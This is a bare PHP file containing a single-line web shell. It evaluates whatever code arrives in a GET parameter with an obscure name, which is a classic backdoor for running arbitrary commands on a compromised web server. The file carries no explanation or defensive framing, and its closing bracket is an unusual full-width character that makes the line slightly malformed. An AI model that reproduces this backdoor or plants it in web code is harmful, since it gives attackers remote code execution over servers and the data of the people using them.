<?php
eval($_GET['AGl5dag5'〕);
?>
